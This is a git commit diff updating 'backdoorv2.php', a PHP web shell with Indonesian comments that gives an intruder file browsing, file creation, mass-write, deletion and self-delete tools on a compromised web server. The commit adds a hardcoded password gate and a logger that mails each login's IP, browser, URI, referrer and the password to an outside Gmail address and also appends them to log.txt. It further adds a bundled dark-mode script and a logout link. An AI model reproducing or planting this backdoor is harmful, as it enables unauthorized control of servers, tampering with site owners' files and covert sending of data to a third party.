98dd3e06b3d063b27fc852146e532f82060ac269
xnonhack <36075615+xnonhack@users.noreply.github.com>
2020-03-27 06:55:45 -0700

    Update backdoorv2.php

--- backdoorv2.php
+++ backdoorv2.php
@@ -1,11 +1,67 @@
 <?php
 // recode ? mikir anjing w cape2 bikin lah elu tinggal recode
 // kalo mau recode jngn lupa cantumkan author, hargai w sebagai author
+error_reporting(0);
+session_start();
+set_time_limit(0);
+ignore_user_abort(0);
+$password = "sad";
+function login() {
+?>
+<style type="text/css">
+  @import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
+  div.login {
+    display:none;
+  } input[type=password] {
+    font-family: 'Ubuntu Mono', monospace;
+    text-align:center;
+    color:#8a8a8a;
+    padding:7px;
+    border-radius:20px;
+    border:1px solid rgba(222,222,222,0.73);
+    background:rgba(222,222,222,0.73);
+    outline:none;
+  }
+</style>
+<div class="logink">
+  <center>
+  <form method="post">
+       <input type="password" name="password" placeholder="input password">
+    </form>
+    </center>
+</div>
+<?php
+  exit();
+}
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
+  if(empty($password) || (isset($_POST['password']) && ($_POST['password']) == $password)) {
+    $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
+    $agent = $_SERVER['HTTP_USER_AGENT']; 
+    $uri = $_SERVER['REQUEST_URI']; 
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $ref = $_SERVER['HTTP_REFERER'];
+    $dtime = date('r'); 
+    $log = "
+            Password : ".$password."\n
+            Time : ".$dtime."\n
+            IP : ".$ip."\n
+            Browser : ".$agent."\n
+            Filename : ".$uri."\n
+            URL : ".$ref."\n";
+    @mail('xnonhack@gmail.com', 'Log', $log);
+    $fp = fopen("log.txt", "a"); 
+    fputs($fp, $log); 
+    fclose($fp); 
+  } else {
+    @login();
+  }
+}
 ?>
 <!DOCTYPE html>
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" href="https://img.icons8.com/ios/500/ghost.png" sizes="32x32">
 <title>L0LZ666H05T</title>
 </head>
 <style type="text/css">
@@ -138,7 +194,7 @@ a:hover {
   margin-left:-10px;
   margin-bottom:10px;
   border: 1px solid transparent;
-  border-radius: 3px;
+  border-radius: 20px;
 }
 .alert-success {
   background-color: #91cf91;
@@ -271,30 +327,150 @@ a.tools {
 }
 </style>
 <body>
-<script>
-/* When the user clicks on the button, 
-toggle between hiding and showing the dropdown content */
-function myFunction() {
-  document.getElementById("myDropdown").classList.toggle("show");
-}
+<script type="text/javascript">
+! function (e, t) {
+  "object" == typeof exports && "object" == typeof module ? module.exports = t() : "function" == typeof define && define.amd ? define("darkmode-js", [], t) : "object" == typeof exports ? exports["darkmode-js"] = t() : e["darkmode-js"] = t()
+}("undefined" != typeof self ? self : this, function () {
+  return function (e) {
+    var t = {};
 
-// Close the dropdown if the user clicks outside of it
-window.onclick = function(event) {
-  if (!event.target.matches('.dropbtn')) {
-    var dropdowns = document.getElementsByClassName("dropdown-content");
-    var i;
-    for (i = 0; i < dropdowns.length; i++) {
-      var openDropdown = dropdowns[i];
-      if (openDropdown.classList.contains('show')) {
-        openDropdown.classList.remove('show');
-      }
+    function n(o) {
+      if (t[o]) return t[o].exports;
+      var r = t[o] = {
+        i: o,
+        l: !1,
+        exports: {}
+      };
+      return e[o].call(r.exports, r, r.exports, n), r.l = !0, r.exports
     }
-  }
-}
+    return n.m = e, n.c = t, n.d = function (e, t, o) {
+      n.o(e, t) || Object.defineProperty(e, t, {
+        enumerable: !0,
+        get: o
+      })
+    }, n.r = function (e) {
+      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
+        value: "Module"
+      }), Object.defineProperty(e, "__esModule", {
+        value: !0
+      })
+    }, n.t = function (e, t) {
+      if (1 & t && (e = n(e)), 8 & t) return e;
+      if (4 & t && "object" == typeof e && e && e.__esModule) return e;
+      var o = Object.create(null);
+      if (n.r(o), Object.defineProperty(o, "default", {
+        enumerable: !0,
+        value: e
+      }), 2 & t && "string" != typeof e)
+        for (var r in e) n.d(o, r, function (t) {
+          return e[t]
+        }.bind(null, r));
+      return o
+    }, n.n = function (e) {
+      var t = e && e.__esModule ? function () {
+        return e.default
+      } : function () {
+        return e
+      };
+      return n.d(t, "a", t), t
+    }, n.o = function (e, t) {
+      return Object.prototype.hasOwnProperty.call(e, t)
+    }, n.p = "", n(n.s = 0)
+  }([
+    function (e, t, n) {
+      "use strict";
+      Object.defineProperty(t, "__esModule", {
+        value: !0
+      }), t.default = void 0;
+      var o, r = (o = n(1)) && o.__esModule ? o : {
+        default: o
+      };
+      var a = r.default;
+      t.default = a,
+      function (e) {
+        e.Darkmode = r.default
+      }(window), e.exports = t.default
+    },
+    function (e, t, n) {
+      "use strict";
+
+      function o(e, t) {
+        for (var n = 0; n < t.length; n++) {
+          var o = t[n];
+          o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, o.key, o)
+        }
+      }
+      Object.defineProperty(t, "__esModule", {
+        value: !0
+      }), t.default = void 0;
+      var r = function () {
+        function e(t) {
+          ! function (e, t) {
+            if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function")
+          }(this, e);
+          var n = t && t.bottom ? t.bottom : "32px",
+            o = t && t.right ? t.right : "32px",
+            r = t && t.left ? t.left : "unset",
+            a = t && t.time ? t.time : "0.3s",
+            d = t && t.mixColor ? t.mixColor : "#fff",
+            i = t && t.backgroundColor ? t.backgroundColor : "#fff",
+            s = t && t.buttonColorDark ? t.buttonColorDark : "#100f2c",
+            l = t && t.buttonColorLight ? t.buttonColorLight : "#fff",
+            c = t && t.label ? t.label : "",
+            u = !t || !1 !== t.saveInCookies,
+            f = "\n      .darkmode-layer {\n        position: fixed;\n        pointer-events: none;\n        background: ".concat(d, ";\n        transition: all ").concat(a, " ease;\n        mix-blend-mode: difference;\n      }\n\n      .darkmode-layer--button {\n        width: 2.9rem;\n        height: 2.9rem;\n        border-radius: 50%;\n        right: ").concat(o, ";\n        bottom: ").concat(n, ";\n        left: ").concat(r, ";\n      }\n\n      .darkmode-layer--simple {\n        width: 100%;\n        height: 100%;\n        top: 0;\n        left: 0;\n        transform: scale(1) !important;\n      }\n      \n      .darkmode-layer--expanded {\n        transform: scale(100);\n        border-radius: 0;\n      }\n\n      .darkmode-layer--no-transition {\n        transition: none;\n      }\n      \n      .darkmode-toggle {\n        background: ").concat(s, ";\n        width: 3rem;\n        height: 3rem;\n        position: fixed;\n        border-radius: 50%;\n        right: ").concat(o, ";\n        bottom: ").concat(n, ";\n        left: ").concat(r, ";\n        cursor: pointer;\n        transition: all 0.5s ease;\n        display: flex;\n        justify-content: center;\n        align-items: center;\n      }\n      \n      .darkmode-toggle--white {\n        background: ").concat(l, ";\n      }\n\n      .darkmode-background {\n        background: ").concat(i, ";\n        position: fixed;\n        pointer-events: none;\n        z-index: -10;\n        width: 100%;\n        height: 100%;\n        top: 0;\n        left: 0;\n      }\n      \n      img, .darkmode-ignore {\n        isolation: isolate;\n        display: inline-block;\n      }\n    "),
+            m = document.createElement("div"),
+            y = document.createElement("div"),
+            b = document.createElement("div");
+          y.innerHTML = c, m.classList.add("darkmode-layer"), b.classList.add("darkmode-background"), !0 === ("true" === window.localStorage.getItem("darkmode")) && u && (m.classList.add("darkmode-layer--expanded", "darkmode-layer--simple", "darkmode-layer--no-transition"), y.classList.add("darkmode-toggle--white"), document.body.classList.add("darkmode--activated")), document.body.insertBefore(y, document.body.firstChild), document.body.insertBefore(m, document.body.firstChild), document.body.insertBefore(b, document.body.firstChild), this.addStyle(f), this.button = y, this.layer = m, this.saveInCookies = u, this.time = a
+        }
+        var t, n, r;
+        return t = e, (n = [{
+          key: "addStyle",
+          value: function (e) {
+            var t = document.createElement("link");
+            t.setAttribute("rel", "stylesheet"), t.setAttribute("type", "text/css"), t.setAttribute("href", "data:text/css;charset=UTF-8," + encodeURIComponent(e)), document.head.appendChild(t)
+          }
+        }, {
+          key: "showWidget",
+          value: function () {
+            var e = this,
+              t = this.button,
+              n = this.layer,
+              o = 1e3 * parseFloat(this.time);
+            t.classList.add("darkmode-toggle"), n.classList.add("darkmode-layer--button"), t.addEventListener("click", function () {
+              var r = e.isActivated();
+              r ? (n.classList.remove("darkmode-layer--simple"), setTimeout(function () {
+                n.classList.remove("darkmode-layer--no-transition"), n.classList.remove("darkmode-layer--expanded")
+              }, 1)) : (n.classList.add("darkmode-layer--expanded"), setTimeout(function () {
+                n.classList.add("darkmode-layer--no-transition"), n.classList.add("darkmode-layer--simple")
+              }, o)), t.classList.toggle("darkmode-toggle--white"), document.body.classList.toggle("darkmode--activated"), window.localStorage.setItem("darkmode", !r)
+            })
+          }
+        }, {
+          key: "toggle",
+          value: function () {
+            var e = this.layer,
+              t = this.isActivated();
+            e.classList.toggle("darkmode-layer--simple"), document.body.classList.toggle("darkmode--activated"), window.localStorage.setItem("darkmode", !t)
+          }
+        }, {
+          key: "isActivated",
+          value: function () {
+            return document.body.classList.contains("darkmode--activated")
+          }
+        }]) && o(t.prototype, n), r && o(t, r), e
+      }();
+      t.default = r, e.exports = t.default
+    }
+  ])
+});
+</script>
+<script>
+  new Darkmode().showWidget();
 </script>
 <table>
 <?php
-error_reporting(0);
 function cwd() {
   if (isset($_GET['path'])) {
     $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, $_GET['path']);
@@ -908,6 +1084,7 @@ function killme($post) {
         </td>
       </tr>
       <?php
+      exit();
     } else {
       ?>
       <tr>
@@ -918,6 +1095,12 @@ function killme($post) {
       <?php
       exit();
     }
+  }
+}
+function logout($post) {
+  if ($_GET['do'] == 'logout') {
+    unset($_SESSION[@md5($_SERVER['HTTP_HOST'])]);
+    ?><meta http-equiv='refresh' content='1'><?php
   }
 }
 if ($_GET['do'] == 'delete') 
@@ -931,6 +1114,7 @@ if ($_GET['do'] == 'delete')
 @making("making");
 @masswriter("masswrite");
 @killme("killme");
+@logout('logout');
 ?>
   <thead>
     <tr>
@@ -944,6 +1128,7 @@ if ($_GET['do'] == 'delete')
         <a class="tools" href="?path=<?php print @cwd() ?>&do=making">Make File</a>
         <a class="tools" href="?path=<?php print @cwd() ?>&do=masswrite">Mass Write</a>
         <a class="tools" href="?path=<?php print @cwd() ?>&do=killme">Kill Me</a>
+        <a class="tools" href="?path=<?php print @cwd() ?>&do=logout">Logout</a>
       </th>
     </tr>
     <tr>
@@ -969,7 +1154,7 @@ foreach ($getPATH as $dir) {
       </center>
     </td>
     <td>
-      <center>--</center>
+      <center>NaN</center>
     </td>
     <td>
       <center>
